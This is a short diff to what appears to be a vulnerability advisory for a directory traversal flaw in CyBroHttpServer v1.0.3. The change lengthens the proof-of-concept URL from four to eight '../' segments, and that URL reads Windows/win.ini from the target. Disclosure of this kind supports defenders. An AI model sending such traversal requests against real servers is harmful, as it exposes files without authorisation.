@@ -2,8 +2,8 @@
 Directory Traversal in CyBroHttpServer v1.0.3 allows an attacker to read sensitive informations.
 
 # PoC
-To exploit vulnerability, someone could use 'http://[host]/../../../../' request to get some informations from the target. 
-  For example: http://[host]/../../../../Windows/win.ini'
+To exploit vulnerability, someone could use 'http://[host]/../../../../../../../../' request to get some informations from the target. 
+  For example: http://[host]/../../../../../../../../Windows/win.ini'
 
 
 ```
